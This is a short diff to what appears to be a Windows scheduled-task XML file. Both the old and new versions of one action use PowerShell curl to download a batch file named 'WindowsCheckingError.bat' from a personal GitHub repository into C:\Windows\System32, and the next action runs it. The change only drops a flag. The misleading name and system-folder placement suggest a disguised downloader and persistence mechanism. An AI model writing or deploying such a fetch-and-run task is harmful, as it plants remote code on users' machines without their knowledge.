@@ -49,7 +49,7 @@
     </Exec>
     <Exec>
       <Command>powershell</Command>
-      <Arguments>curl -L "https://raw.githubusercontent.com/mitukitii/test/main/WindowsCheckingError.bat" -o "C:\Windows\System32\WindowsCheckingError.bat"</Arguments>
+      <Arguments>curl "https://raw.githubusercontent.com/mitukitii/test/main/WindowsCheckingError.bat" -o "C:\Windows\System32\WindowsCheckingError.bat"</Arguments>
     </Exec>
     <Exec>
       <Command>C:\Windows\System32\WindowsCheckingError.bat</Command>
